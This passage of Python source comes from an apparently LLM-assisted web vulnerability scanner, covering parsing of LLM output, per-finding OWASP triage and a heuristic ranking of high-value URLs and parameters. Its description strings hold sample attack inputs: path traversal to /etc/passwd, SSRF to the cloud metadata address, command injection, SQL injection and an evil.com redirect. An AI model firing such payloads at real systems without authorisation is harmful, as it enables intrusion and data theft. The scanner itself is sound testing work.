            if ch == "\\":
                escape = True
                continue
            if ch == '"':
                in_string = not in_string
                continue
            if in_string:
                continue
            if ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    end = i
                    break
        if end == -1 or end <= start:
            # TRUNCATED JSON — the LLM hit its completion-token cap
            # (finish_reason=length; common with local servers capped at
            # e.g. 4096 completion tokens). Rather than discarding the
            # whole plan, close what we have (open strings/brackets) and
            # progressively drop the dangling truncated element until
            # something parses — a partial plan beats no plan.
            closed = self._close_truncated_json(text[start:])
            if not closed:
                return self._empty_plan(
                    "No complete JSON object found in LLM response (the response "
                    "appears TRUNCATED — the LLM likely hit its completion-token "
                    "cap; consider raising the server's max completion tokens or "
                    "reducing --llm-tokens)")
            self.logger.log("llm_json_truncated",
                            "plan JSON was truncated (LLM token cap) — "
                            "auto-closed and salvaging the partial plan")
            json_str = closed
        else:
            json_str = text[start:end + 1]
        try:
            plan = json.loads(json_str)
        except json.JSONDecodeError as e:
            # Try to repair common LLM JSON errors:
            # 1. Unescaped quotes inside string values
            # 2. Missing commas between items
            # 3. Trailing commas before } or ]
            # 4. Single quotes instead of double quotes
            # 5. Unquoted keys
            # 6. Comments
            try:
                repaired = _repair_json(json_str)
                plan = json.loads(repaired)
                self.logger.log("llm_json_repaired",
                               f"plan JSON was repaired after parse error: {e}")
            except Exception as repair_err:
                # Log the first 200 chars of the raw response so the
                # user can see what the LLM actually returned. This
                # makes it much easier to debug LLM prompt issues.
                self.logger.log("llm_json_parse_error",
                               f"plan JSON parse failed: {e} | "
                               f"repair also failed: {repair_err} | "
                               f"raw first 200 chars: {json_str[:200]!r}")
                return self._empty_plan(f"JSON parse error: {e}")

        # Validate + normalise the fields.
        return {
            "priority_inputs": self._ensure_str_list(plan.get("priority_inputs")),
            "custom_payloads": self._ensure_str_list(plan.get("custom_payloads")),
            "additional_urls": self._ensure_str_list(plan.get("additional_urls")),
            "reasoning": str(plan.get("reasoning", ""))[:1000],
            "llm_error": None,
        }

    @staticmethod
    def _close_truncated_json(s: str) -> str:
        """Best-effort repair of a TRUNCATED JSON document.

        Closes an open string + any open brackets/braces. If the result
        still doesn't parse (a dangling key/element was cut mid-token),
        progressively cuts back to the last comma and retries — dropping
        the partial tail element until a valid document remains. Returns
        "" if nothing parseable can be salvaged.
        """
        def close(t: str) -> str:
            stack: List[str] = []
            in_str = False
            esc = False
            for ch in t:
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == '"':
                    in_str = not in_str
                elif not in_str:
                    if ch in "{[":
                        stack.append(ch)
                    elif ch in "}]":
                        if stack:
                            stack.pop()
            r = t
            if in_str:
                r += '"'
            r = r.rstrip()
            while r.endswith((",", ":")):
                r = r[:-1].rstrip()
            closer = {"{": "}", "[": "]"}
            for ch in reversed(stack):
                r += closer[ch]
            return r

        work = s
        candidate = close(work)
        for _ in range(10):
            try:
                json.loads(candidate)
                return candidate
            except json.JSONDecodeError:
                idx = work.rfind(",")
                if idx == -1:
                    return ""
                work = work[:idx]
                candidate = close(work)
        return ""

    def _ensure_str_list(self, value: Any) -> List[str]:
        """Ensure a value is a list of strings (defensive parsing).

        Only ACTUAL strings (and plain numbers) are kept. LLMs sometimes
        echo the input digest back as OBJECTS — e.g. custom_payloads = a list
        of {"name": "q", ...} dicts — and stringifying those produced
        garbage "payloads" like "{'name': 'q', ...}" that then polluted the
        fuzzing list and the payload manifest. Non-string items are dropped
        (and logged) instead.
        """
        if not isinstance(value, list):
            return []
        out: List[str] = []
        dropped = 0
        for item in value[:80]:
            if isinstance(item, str):
                out.append(item)
            elif isinstance(item, (int, float)) and not isinstance(item, bool):
                out.append(str(item))
            else:
                dropped += 1
        if dropped:
            self.logger.log("llm_planner_parse",
                            f"dropped {dropped} non-string item(s) from a plan "
                            "list (LLM returned objects where strings were "
                            "expected)")
        return out[:50]

    def _empty_plan(self, error: str) -> Dict[str, Any]:
        """Return an empty plan with an error message (for graceful degradation)."""
        return {
            "priority_inputs": [],
            "custom_payloads": [],
            "additional_urls": [],
            "reasoning": "",
            "llm_error": error,
        }


# ============================================================================
# SECTION 8.6 — LLM ANALYZER (Post-Scan Vulnerability Analysis)
# ============================================================================
#
# The LLMAnalyzer runs AFTER the active scanning phase. It sends the
# scanner's findings + a sample of raw HTTP responses to the LLM and asks
# it to:
#
#   1. Detect vulnerabilities the regex patterns MISSED (LLMs can spot
#      subtle indicators like reflected DOM state, error page patterns,
#      and contextual issues that rigid regex can't catch).
#   2. Classify each finding (both regex-detected and LLM-detected) into
#      the appropriate OWASP Top 10 (2025) category.
#   3. Identify likely FALSE POSITIVES (regex matches that are actually
#      benign — e.g. an error page that says "SQL syntax" in a help
#      document, not a real SQL error).
#   4. Suggest follow-up tests for the engineer to perform manually.
#
# CRITICAL: The LLM's analysis is advisory only. It does NOT modify the
# scanner's findings, evidence, or verdicts. Its output is saved to
# llm_analysis.json and displayed in a dedicated sub-tab so the engineer
# can use it as a triage aid. Every LLM-detected vulnerability is marked
# "UNVERIFIED — Requires Manual Confirmation" just like regex findings.

class LLMAnalyzer:
    """Asks the LLM to analyse scan results for missed vulnerabilities.

    Used only when --llm-analyze is passed. If the LLM is not configured
    or returns an error, the analyzer degrades gracefully (returns an
    empty analysis) and the scan report is generated without it.
    """

    def __init__(self, llm_adapter: LLMAdapter, logger: ExecutionTrailLogger) -> None:
        self.llm = llm_adapter
        self.logger = logger

    async def analyze(
        self,
        target_url: str,
        findings: List["Finding"],
        passive_findings: Any,
        ssl_record: Any,
        crawl_map: List["CrawledURL"],
        attack_surface: List["InputField"],
    ) -> Dict[str, Any]:
        """Ask the LLM to analyse scan results — ONE FINDING AT A TIME.

        This avoids the token-limit truncation problem where sending all
        findings in one LLM call produces a JSON response too large for
        the LLM's max_tokens. Each finding gets its own small LLM call
        with a tiny JSON response that always fits.

        Results are accumulated and saved incrementally so partial
        results persist even if the LLM fails halfway through.

        Returns a dict with keys:
          - owasp_classifications: List of {finding_id, owasp_category, confidence}
          - false_positive_candidates: List of {finding_id, reasoning}
          - follow_up_tests: List of strings
          - summary: str (LLM's overall assessment)
          - llm_error: Optional[str]
        """
        self.logger.log("llm_analyzer_start",
                        f"analysing {len(findings)} findings (one at a time)")

        if not self.llm.enabled:
            llm_url = os.environ.get("LLM_BASE_URL", "")
            if not llm_url:
                self.logger.log("llm_analyzer_skip",
                                "LLM not configured — LLM_BASE_URL env var is empty. "
                                "Check Settings → LLM config in the web UI.")
            else:
                self.logger.log("llm_analyzer_skip",
                                f"LLM not configured — LLM_BASE_URL={llm_url[:50]}...")
            return self._empty_analysis("LLM not configured")

        # --- Process each finding individually ---
        owasp_classifications = []
        false_positive_candidates = []
        follow_up_tests = set()  # dedup

        # Also do a quick overall assessment at the end
        # (using just the finding titles — very small prompt)
        finding_summaries = []

        for i, finding in enumerate(findings):
            if GLOBAL_STATE.stop_event.is_set():
                break

            # Build a TINY prompt for this single finding
            finding_info = {
                "finding_id": finding.finding_id,
                "title": finding.title,
                "severity": finding.severity,
                "owasp_category": finding.owasp_category,
                "url": finding.url,
                "payload": finding.payload[:200] if finding.payload else "",
                "patterns_matched": finding.patterns_matched,
            }
            finding_summaries.append(f"{finding.title} ({finding.severity}) at {finding.url}")

            single_prompt = f"""You are a web security analyst. Analyse this SINGLE finding and return a JSON object.

FINDING:
{json.dumps(finding_info, indent=2)}

TARGET: {target_url}

Return ONLY this JSON (no markdown, no explanation):
{{
  "owasp_category": "most appropriate OWASP Top 10 2025 category (e.g. A03:2025 Injection, A05:2025 Security Misconfiguration)",
  "confidence": "high|medium|low",
  "is_false_positive": true|false,
  "false_positive_reason": "why this is likely a false positive (empty string if not)",
  "follow_up_test": "one specific manual test the engineer should perform"
}}"""

            single_payload = json.dumps({
                "model": self.llm.model,
                "messages": [
                    {"role": "system", "content": "You are a web security analyst. You output ONLY JSON."},
                    {"role": "user", "content": single_prompt},
                ],
                "max_tokens": 512,
                "temperature": 0.2,
            }).encode("utf-8")

            try:
                # Use the LLM adapter's endpoint directly (bypass summarize())
                import urllib.request as _url_req
                req = _url_req.Request(
                    self.llm.base_url,
                    data=single_payload,
                    headers={
                        "Content-Type": "application/json",
                        **({"Authorization": f"Bearer {self.llm.api_key}"}
                           if self.llm.api_key else {}),
                    },
                    method="POST",
                )
                llm_timeout = int(os.environ.get("WEBRECON_LLM_TIMEOUT_SECONDS", "120"))
                loop = asyncio.get_running_loop()
                resp = await loop.run_in_executor(
                    None, lambda: _url_req.urlopen(req, timeout=llm_timeout)
                )
                body = resp.read().decode("utf-8", errors="replace")
                data = json.loads(body)
                content = data.get("choices", [{}])[0].get("message", {}).get("content", "")
                content = _strip_think_tags(content)

                # Parse the small JSON response
                # Try to find { ... } in the response
                start = content.find("{")
                end = content.rfind("}")
                if start != -1 and end != -1 and end > start:
                    json_str = content[start:end + 1]
                    try:
                        result = json.loads(json_str)
                    except json.JSONDecodeError:
                        # Try repair
                        try:
                            result = json.loads(_repair_json(json_str))
                        except Exception:
                            result = {}
                else:
                    result = {}

                # Collect results
                owasp_cat = result.get("owasp_category", finding.owasp_category)
                confidence = result.get("confidence", "medium")
                owasp_classifications.append({
                    "finding_id": finding.finding_id,
                    "owasp_category": owasp_cat,
                    "confidence": confidence,
                    "reasoning": f"LLM classified as {owasp_cat} (confidence: {confidence})",
                })

                if result.get("is_false_positive"):
                    false_positive_candidates.append({
                        "finding_id": finding.finding_id,
                        "reasoning": result.get("false_positive_reason", "LLM flagged as likely false positive"),
                    })

                follow_up = result.get("follow_up_test", "")
                if follow_up:
                    follow_up_tests.add(follow_up)

                self.logger.log("llm_analyzer_progress",
                               f"finding {i+1}/{len(findings)}: {finding.title[:50]} → "
                               f"{owasp_cat} ({confidence})"
                               f"{' [FP]' if result.get('is_false_positive') else ''}")

            except Exception as e:
                self.logger.log("llm_analyzer_finding_error",
                               f"finding {i+1}/{len(findings)} failed: {type(e).__name__}: {e}")
                # Still add a default classification
                owasp_classifications.append({
                    "finding_id": finding.finding_id,
                    "owasp_category": finding.owasp_category,
                    "confidence": "low",
                    "reasoning": f"LLM analysis failed: {type(e).__name__}",
                })

            # Small delay between calls to avoid overwhelming the LLM
            await asyncio.sleep(0.5)

        # --- Generate overall summary (small prompt with just titles) ---
        summary = ""
        try:
            summary_prompt = f"""You are a web security analyst. Write a 2-3 paragraph executive summary of these scan findings.

TARGET: {target_url}
TOTAL FINDINGS: {len(findings)}

FINDING SUMMARIES (title + severity):
{chr(10).join(finding_summaries[:30])}

Write a factual, neutral summary. State that all findings are UNVERIFIED and require manual confirmation."""

            summary_payload = json.dumps({
                "model": self.llm.model,
                "messages": [
                    {"role": "system", "content": "You are a security report summariser. Produce a factual summary."},
                    {"role": "user", "content": summary_prompt},
                ],
                "max_tokens": 1024,
                "temperature": 0.2,
            }).encode("utf-8")

            req2 = _url_req.Request(
                self.llm.base_url,
                data=summary_payload,
                headers={
                    "Content-Type": "application/json",
                    **({"Authorization": f"Bearer {self.llm.api_key}"}
                       if self.llm.api_key else {}),
                },
                method="POST",
            )
            resp2 = await loop.run_in_executor(
                None, lambda: _url_req.urlopen(req2, timeout=llm_timeout)
            )
            body2 = resp2.read().decode("utf-8", errors="replace")
            data2 = json.loads(body2)
            summary = data2.get("choices", [{}])[0].get("message", {}).get("content", "")
            summary = _strip_think_tags(summary)
        except Exception:
            summary = f"Scan completed with {len(findings)} findings. All findings are UNVERIFIED and require manual confirmation."

        self.logger.log("llm_analyzer_done",
                       f"owasp_classifications={len(owasp_classifications)} "
                       f"false_positives={len(false_positive_candidates)} "
                       f"follow_ups={len(follow_up_tests)}")

        return {
            "owasp_classifications": owasp_classifications,
            "llm_detected_vulns": [],  # not used in per-finding mode
            "false_positive_candidates": false_positive_candidates,
            "follow_up_tests": list(follow_up_tests),
            "summary": summary,
            "llm_error": None,
        }

    def _build_digest(
        self,
        target_url: str,
        findings: List["Finding"],
        passive_findings: Any,
        ssl_record: Any,
        crawl_map: List["CrawledURL"],
        attack_surface: List["InputField"],
    ) -> Dict[str, Any]:
        """Build a compact digest of scan results for the LLM.

        We cap the size to fit within --llm-tokens. We prioritise:
          - All regex-detected findings (with payloads + pattern matches)
          - Passive findings (missing headers, cookies, SSL issues)
          - A sample of crawled URLs + inputs (for context)
        """
        # Findings: include the full payload + matched patterns for each.
        findings_digest = [
            {
                "id": f.finding_id,
                "title": f.title,
                "severity": f.severity,
                "owasp_category": f.owasp_category,
                "url": f.url,
                "payload": f.payload[:200],  # truncate long payloads
                "patterns_matched": f.patterns_matched,
            }
            for f in findings[:30]  # cap at 30 findings
        ]

        # Passive findings summary.
        passive_digest = {
            "missing_headers": passive_findings.missing_security_headers if passive_findings else [],
            "insecure_cookies": [
                c.get("name") for c in (passive_findings.insecure_cookies if passive_findings else [])
            ][:10],
            "mixed_content_count": len(passive_findings.mixed_content) if passive_findings else 0,
        }

        # SSL summary.
        ssl_digest = {
            "issuer": ssl_record.issuer if ssl_record else "",
            "is_self_signed": ssl_record.is_self_signed if ssl_record else False,
            "is_expired": ssl_record.is_expired if ssl_record else False,
            "hostname_mismatch": ssl_record.hostname_mismatch if ssl_record else False,
            "weak_ciphers": ssl_record.weak_ciphers_detected if ssl_record else [],
            "weak_protocols": ssl_record.weak_protocols_detected if ssl_record else [],
        } if ssl_record else {}

        # Crawl map sample (in-scope URLs only).
        urls_sample = [c.url for c in crawl_map if c.in_scope][:30]

        # Attack surface sample.
        inputs_sample = [
            {"name": i.name, "location": i.location, "url": i.url, "method": i.method}
            for i in attack_surface if i.name
        ][:30]

        return {
            "target_url": target_url,
            "findings_count": len(findings),
            "findings": findings_digest,
            "passive": passive_digest,
            "ssl": ssl_digest,
            "urls_crawled": len(crawl_map),
            "urls_sample": urls_sample,
            "inputs_count": len(attack_surface),
            "inputs_sample": inputs_sample,
        }

    def _build_prompt(self, digest: Dict[str, Any]) -> str:
        """Build the analysis prompt for the LLM."""
        digest_json = json.dumps(digest, indent=2, ensure_ascii=False, default=str)
        # Truncate to fit token budget.
        char_budget = self.llm.max_tokens * 4 - 2000
        if len(digest_json) > char_budget:
            digest_json = digest_json[:char_budget] + "\n...[truncated]"

        return f"""You are a web application security analyst. Analyse the following scan results and provide a vulnerability assessment.

SCAN RESULTS DIGEST:
{digest_json}

Provide your analysis as RAW JSON (no markdown fences, no preamble) with exactly these keys:

{{
  "owasp_classifications": [
    {{"finding_id": "...", "owasp_category": "A05:2025 Injection", "confidence": "high|medium|low", "reasoning": "..."}}
  ],
  "llm_detected_vulns": [
    {{"title": "...", "owasp_category": "A01:2025 Broken Access Control", "url": "...", "severity": "High|Medium|Low", "reasoning": "..."}}
  ],
  "false_positive_candidates": [
    {{"finding_id": "...", "reasoning": "why this is likely a false positive"}}
  ],
  "follow_up_tests": [
    "suggested manual test 1",
    "suggested manual test 2"
  ],
  "summary": "1-2 paragraph overall assessment of the target's security posture"
}}

Rules:
1. owasp_classifications: For each finding in the digest, suggest the most appropriate OWASP Top 10 (2025) category + confidence.
2. llm_detected_vulns: Identify vulnerabilities the scanner's regex may have MISSED based on the URLs, inputs, and response patterns. For example: IDOR (any user ID returns data), path traversal, missing access control, sensitive data exposure.
3. false_positive_candidates: Flag findings that look like false positives (e.g. the "SQL syntax" match was in a help page, not a real SQL error).
4. follow_up_tests: Suggest 3-5 manual tests the engineer should perform.
5. ALL findings (regex + LLM-detected) are UNVERIFIED. Use language like "potential", "likely", "requires manual verification".
6. Be specific. Reference actual URLs and input names from the digest."""

    def _parse_analysis(self, raw_response: str) -> Dict[str, Any]:
        """Parse the LLM's JSON response. Defensive against markdown fences + extra data."""
        # Strip <think>...</think> tags (reasoning models like DeepSeek-R1)
        stripped = _strip_think_tags(raw_response)

        # Try the stripped response first. If no JSON is found, fall back
        # to the ORIGINAL response — the LLM may have put the JSON inside
        # <think> tags, and the <think> stripping consumed it.
        for text_to_try in [stripped, raw_response]:
            text = text_to_try.strip()
            if text.startswith("```"):
                lines = text.split("\n")
                if lines[0].startswith("```"):
                    lines = lines[1:]
                if lines and lines[-1].strip() == "```":
                    lines = lines[:-1]
                text = "\n".join(lines)
            # Use brace matching to extract exactly ONE JSON object.
            start = text.find("{")
            if start == -1:
                continue  # try the next candidate
            depth = 0
            in_string = False
            escape = False
            end = -1
            for i in range(start, len(text)):
                ch = text[i]
                if escape:
                    escape = False
                    continue
                if ch == "\\":
                    escape = True
                    continue
                if ch == '"':
                    in_string = not in_string
                    continue
                if in_string:
                    continue
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        end = i
                        break
            if end == -1 or end <= start:
                # No complete JSON object found — the response may have
                # been TRUNCATED (max_tokens too low). Try to repair by
                # closing all open braces/brackets.
                if depth > 0:
                    # We have unclosed braces — the JSON was cut off.
                    # Take everything from `start` to the end, try to
                    # close it.
                    truncated = text[start:]
                    # Close any unclosed string
                    if in_string:
                        truncated += '"'
                    # Close open brackets/braces (reverse order)
                    # Count open brackets vs close brackets
                    open_brackets = truncated.count("[") - truncated.count("]")
                    open_braces = truncated.count("{") - truncated.count("}")
                    # Remove trailing incomplete entries (e.g. trailing comma + partial key)
                    truncated = _re_module.sub(r',\s*"[^"]*$', '', truncated)
                    truncated = _re_module.sub(r',\s*$', '', truncated)
                    # Close brackets first, then braces
                    truncated += "]" * max(0, open_brackets)
                    truncated += "}" * max(0, open_braces)
                    try:
                        analysis = json.loads(truncated)
                        self.logger.log("llm_json_truncated_repaired",
                                       f"analysis JSON was truncated (max_tokens too low?) — "
                                       f"repaired by closing {open_braces} unclosed brace(s) + "
                                       f"{open_brackets} unclosed bracket(s)")
                        break
                    except json.JSONDecodeError:
                        pass  # repair failed — try next candidate
                continue  # try the next candidate
            json_str = text[start:end + 1]
            try:
                analysis = json.loads(json_str)
                # Success! Log if we fell back to the raw response.
                if text_to_try is raw_response and stripped != raw_response:
                    self.logger.log("llm_json_recovered",
                                   "analysis JSON recovered from inside <think> tags")
                break
            except json.JSONDecodeError as e:
                try:
                    repaired = _repair_json(json_str)
                    analysis = json.loads(repaired)
                    self.logger.log("llm_json_repaired",
                                   f"analysis JSON was repaired after parse error: {e}")
                    break
                except Exception:
                    # Try truncation repair on this candidate too
                    if depth > 0 or "{" in json_str:
                        truncated = json_str
                        if in_string:
                            truncated += '"'
                        open_brackets = truncated.count("[") - truncated.count("]")
                        open_braces = truncated.count("{") - truncated.count("}")
                        truncated = _re_module.sub(r',\s*"[^"]*$', '', truncated)
                        truncated = _re_module.sub(r',\s*$', '', truncated)
                        truncated += "]" * max(0, open_brackets)
                        truncated += "}" * max(0, open_braces)
                        try:
                            analysis = json.loads(truncated)
                            self.logger.log("llm_json_truncated_repaired",
                                           f"analysis JSON was truncated — repaired by closing braces")
                            break
                        except Exception:
                            pass
                    continue  # try the next candidate
        else:
            # Both candidates failed — log the first 200 chars for debugging
            self.logger.log("llm_json_parse_error",
                           f"analysis JSON parse failed — "
                           f"raw first 200 chars: {raw_response[:200]!r}")
            return self._empty_analysis("No complete JSON object found in LLM response")

        return {
            "owasp_classifications": analysis.get("owasp_classifications", []) if isinstance(analysis.get("owasp_classifications"), list) else [],
            "llm_detected_vulns": analysis.get("llm_detected_vulns", []) if isinstance(analysis.get("llm_detected_vulns"), list) else [],
            "false_positive_candidates": analysis.get("false_positive_candidates", []) if isinstance(analysis.get("false_positive_candidates"), list) else [],
            "follow_up_tests": [str(t) for t in analysis.get("follow_up_tests", [])][:20] if isinstance(analysis.get("follow_up_tests"), list) else [],
            "summary": str(analysis.get("summary", ""))[:2000],
            "llm_error": None,
        }

    def _empty_analysis(self, error: str) -> Dict[str, Any]:
        """Return an empty analysis result with an error message.

        Used when the LLM is unavailable or returns an error — ensures the
        scan report can still be generated without the LLM analysis section.
        """
        return {
            "owasp_classifications": [],
            "llm_detected_vulns": [],
            "false_positive_candidates": [],
            "follow_up_tests": [],
            "summary": "",
            "llm_error": error,
        }


# ============================================================================
# SECTION 8.7 — INTERESTING LOCATIONS (Attack Surface Triage)
# ============================================================================
#
# The InterestingLocations analyzer runs AFTER crawling + attack surface
# mapping. It applies HEURISTICS (not LLM) to flag URLs + inputs that look
# like high-value targets for manual pentesting. Examples:
#
#   - Admin/config endpoints: /admin, /config, /.git, /phpinfo, /server-status
#   - API endpoints: /api/, /api/v1/, /graphql, /rest/
#   - Auth endpoints: /login, /register, /password-reset, /oauth
#   - File operations: /upload, /download, /file, params named 'file','path'
#   - ID-style parameters: id, uid, user_id, file_id (IDOR candidates)
#   - Redirect parameters: redirect, url, next, return (open redirect)
#   - Command/exec parameters: cmd, exec, command (command injection)
#   - Search/query parameters: q, search, query (XSS candidates)
#   - Sensitive params: token, key, secret, password, api_key
#
# The output is saved to interesting_locations.json and displayed in a
# dedicated sub-tab so the pentester can quickly see "what should I test
# first?" without reading through the full crawl map.

class InterestingLocations:
    """Flags high-value URLs + inputs for manual pentesting.

    Uses pure heuristics (regex + keyword matching) — no LLM required.
    This runs on every scan (not gated behind a flag) because it's fast
    and the output is immediately actionable.
    """

    # URL path patterns that indicate high-value endpoints.
    # Each entry: (regex, category, description)
    URL_PATTERNS: List[Tuple["re.Pattern", str, str]] = [
        # --- Admin / config panels ---
        (re.compile(r"/admin(?:/|$|\?)", re.I), "Admin Panel",
         "Administrative interface — test for auth bypass, default creds, forced browsing"),
        (re.compile(r"/config(?:/|$|\?)", re.I), "Config Endpoint",
         "Configuration endpoint — may leak credentials, internal paths, or settings"),
        (re.compile(r"/\.git(?:/|$|\?)", re.I), "Version Control Exposure",
         ".git directory exposed — can leak full source code + commit history"),
        (re.compile(r"/\.env(?:$|\?)", re.I), "Environment File",
         ".env file exposed — typically contains DB credentials, API keys, secrets"),
        (re.compile(r"/phpinfo(?:\.php)?(?:$|\?)", re.I), "PHP Info Page",
         "phpinfo() output — leaks PHP version, modules, server config, paths"),
        (re.compile(r"/server-status(?:$|\?)", re.I), "Apache server-status",
         "Apache mod_status page — leaks request URLs, worker state, internal IPs"),
        (re.compile(r"/backup(?:/|$|\?)", re.I), "Backup Directory",
         "Backup directory — may contain database dumps, source archives, config backups"),
        (re.compile(r"/debug(?:/|$|\?)", re.I), "Debug Endpoint",
         "Debug endpoint — may leak stack traces, internal state, or enable code exec"),

        # --- API endpoints ---
        (re.compile(r"/api(?:/|$|\?)", re.I), "API Endpoint",
         "REST/JSON API — test for IDOR, auth bypass, injection, mass assignment"),
        (re.compile(r"/graphql(?:$|\?)", re.I), "GraphQL Endpoint",
         "GraphQL — test for introspection, batching attacks, auth bypass, SSRF"),
        (re.compile(r"/rest(?:/|$|\?)", re.I), "REST API",
         "REST API endpoint — test for IDOR, auth, injection"),
        (re.compile(r"/soap(?:/|$|\?)", re.I), "SOAP API",
         "SOAP API — test for XXE, injection, WSDL enumeration"),

        # --- Auth endpoints ---
        (re.compile(r"/login(?:$|\?)", re.I), "Login Page",
         "Login form — test for SQLi, brute force, credential stuffing, auth bypass"),
        (re.compile(r"/register(?:$|\?)", re.I), "Registration Page",
         "Registration — test for account enumeration, mass registration, XSS"),
        (re.compile(r"/password-reset|/forgot-password|/reset", re.I), "Password Reset",
         "Password reset — test for token prediction, email enumeration, host header injection"),
        (re.compile(r"/oauth|/auth|/callback", re.I), "OAuth/Auth Callback",
         "OAuth flow — test for redirect_uri bypass, code theft, state fixation"),
        (re.compile(r"/logout(?:$|\?)", re.I), "Logout Endpoint",
         "Logout — test for CSRF (logout-as-attack), session fixation"),

        # --- File operations ---
        (re.compile(r"/upload(?:/|$|\?)", re.I), "File Upload",
         "File upload — test for unrestricted file type, path traversal, RCE via webshell"),
        (re.compile(r"/download(?:/|$|\?)", re.I), "File Download",
         "File download — test for path traversal, LFI, arbitrary file read"),
        (re.compile(r"/file(?:/|$|\?)", re.I), "File Endpoint",
         "File endpoint — test for path traversal, LFI, SSRF"),

        # --- Other interesting ---
        (re.compile(r"/upload|/import|/export", re.I), "Data Import/Export",
         "Import/export endpoint — test for XXE, CSV injection, SSRF"),
        (re.compile(r"/webhook|/callback|/notify", re.I), "Webhook/Callback",
         "Webhook — test for SSRF, auth bypass, replay attacks"),
        (re.compile(r"/search(?:/|$|\?)", re.I), "Search Endpoint",
         "Search — test for reflected XSS, SQLi, NoSQLi"),
        (re.compile(r"/user(?:/|$|\?)", re.I), "User Profile",
         "User profile — test for IDOR, auth bypass, info disclosure"),
    ]

    # Parameter names that indicate high-value injection points.
    # Each entry: (set of name keywords, category, description)
    PARAM_CATEGORIES: List[Tuple[List[str], str, str]] = [
        # IDOR candidates — any param that looks like an identifier.
        (["id", "uid", "user_id", "userid", "file_id", "fileid", "doc_id",
          "docid", "account_id", "accountid", "order_id", "orderid",
          "post_id", "postid", "item_id", "itemid", "record_id", "ref",
          "reference", "number", "no"],
         "IDOR Candidate",
         "ID-style parameter — test IDOR by changing the value (e.g. id=1 → id=2)"),

        # Open redirect candidates.
        (["redirect", "redirect_url", "redirect_uri", "url", "return",
          "return_url", "returnurl", "next", "next_url", "callback",
          "callback_url", "dest", "destination", "go", "target", "to",
          "continue", "redir"],
         "Open Redirect Candidate",
         "Redirect-style parameter — test for open redirect (url=https://evil.com)"),

        # Command injection candidates.
        (["cmd", "command", "exec", "execute", "run", "shell", "system",
          "ping", "test", "eval"],
         "Command Injection Candidate",
         "Command-style parameter — test for OS command injection (cmd=;id)"),

        # File/path traversal candidates.
        (["file", "filename", "path", "filepath", "page", "template",
          "document", "doc", "include", "require", "load", "module",
          "lang", "language", "content", "body", "data"],
         "Path Traversal / LFI Candidate",
         "File/path parameter — test for path traversal (file=../../etc/passwd) + LFI"),

        # SSRF candidates.
        (["proxy", "fetch", "retrieve", "source", "src", "origin", "host",
          "site", "server", "remote", "external", "image", "img", "avatar",
          "favicon"],
         "SSRF Candidate",
         "URL-fetching parameter — test for SSRF (url=http://169.254.169.254/)"),

        # SQL injection candidates (search/query params).
        (["q", "query", "search", "keyword", "keywords", "find", "filter",
          "where", "condition", "sort", "order", "group", "having"],
         "SQL Injection Candidate",
         "Search/query parameter — test for SQLi (q=' OR '1'='1) + NoSQLi"),

        # Sensitive params (info disclosure / token theft).
        (["token", "key", "secret", "password", "passwd", "pwd", "api_key",
          "apikey", "access_token", "auth", "session", "csrf", "xsrf",
          "jwt", "bearer"],
         "Sensitive Parameter",
         "Sensitive parameter name — check if value is leaked in response, logs, or Referer"),

        # XSS candidates (text/reflection params).
        (["name", "title", "subject", "message", "comment", "description",
          "content", "text", "body", "html", "value", "label", "note",
          "notes"],
         "XSS Candidate",
         "Text/reflection parameter — test for reflected/stored XSS"),
    ]

    def __init__(self, logger: ExecutionTrailLogger) -> None:
        self.logger = logger

    def analyze(
        self,
        crawl_map: List["CrawledURL"],
        attack_surface: List["InputField"],
        header_records: List["HeaderRecord"],
    ) -> Dict[str, Any]:
        """Analyze crawl results + return interesting locations grouped by category.

        Returns a dict:
          - url_findings: List of {url, category, description, source}
          - param_findings: List of {url, param_name, location, category, description}
          - header_findings: List of {header, value, category, description}
          - summary: Dict of {category: count}
        """
        url_findings: List[Dict[str, Any]] = []
        param_findings: List[Dict[str, Any]] = []
        header_findings: List[Dict[str, Any]] = []

        # --- Analyze URLs for interesting path patterns ---
        seen_urls: Set[str] = set()
        for cu in crawl_map:
            if not cu.in_scope:
                continue
            url = cu.url
            # Check each URL pattern.
            for pattern, category, description in self.URL_PATTERNS:
                if pattern.search(url):
                    key = (url, category)
                    if key in seen_urls:
                        continue
                    seen_urls.add(key)
                    url_findings.append({
                        "url": url,
                        "category": category,
                        "description": description,
                        "source": f"crawl (depth {cu.depth})",
                    })
                    break  # one category per URL (first match wins)

        # --- Analyze inputs for interesting parameter names ---
        seen_params: Set[Tuple[str, str, str]] = set()
        for inp in attack_surface:
            if not inp.name:
                continue
            name_lower = inp.name.lower()
            # Check each parameter category.
            for keywords, category, description in self.PARAM_CATEGORIES:
                # Match if the param name IS one of the keywords, or
                # CONTAINS one of the keywords (e.g. 'user_id' contains 'id').
                matched = False
                for kw in keywords:
                    if name_lower == kw or name_lower.startswith(kw + "_") or name_lower.endswith("_" + kw) or name_lower == kw.replace("_", ""):
                        matched = True
                        break
                if matched:
                    key = (inp.url, inp.name, category)
                    if key in seen_params:
                        continue
                    seen_params.add(key)
                    param_findings.append({
                        "url": inp.url,
                        "param_name": inp.name,
                        "location": inp.location,
                        "method": inp.method,
                        "input_type": inp.input_type,
                        "category": category,
                        "description": description,
                    })
                    break  # one category per param (first match wins)

        # --- Analyze headers for info disclosure ---
        for h in header_records:
            name_lower = h.name.lower()
            value_lower = h.value.lower()
            # Server banner (tech stack fingerprint).
            if name_lower == "server":
                header_findings.append({
                    "header": h.name,
                    "value": h.value,
                    "category": "Server Banner (Info Disclosure)",
                    "description": f"Server software disclosed: {h.value}. Use for CVE lookup + targeted attacks.",
                })
            elif name_lower == "x-powered-by":
                header_findings.append({
                    "header": h.name,
                    "value": h.value,
                    "category": "Framework Banner (Info Disclosure)",
                    "description": f"Framework disclosed: {h.value}. Use for CVE lookup + targeted attacks.",
                })
            elif name_lower == "x-aspnet-version":
                header_findings.append({
                    "header": h.name,
                    "value": h.value,
                    "category": "ASP.NET Version (Info Disclosure)",
                    "description": f"ASP.NET version disclosed: {h.value}. Disable in web.config.",
                })
            # Debug headers that may leak info.
            elif "debug" in name_lower or "trace" in name_lower:
                header_findings.append({
                    "header": h.name,
                    "value": h.value,
                    "category": "Debug Header",
                    "description": f"Debug/trace header present — may leak internal state or enable debugging.",
                })

        # --- Build summary counts ---
        summary: Dict[str, int] = {}
        for f in url_findings:
            summary[f["category"]] = summary.get(f["category"], 0) + 1
        for f in param_findings:
            summary[f["category"]] = summary.get(f["category"], 0) + 1
        for f in header_findings:
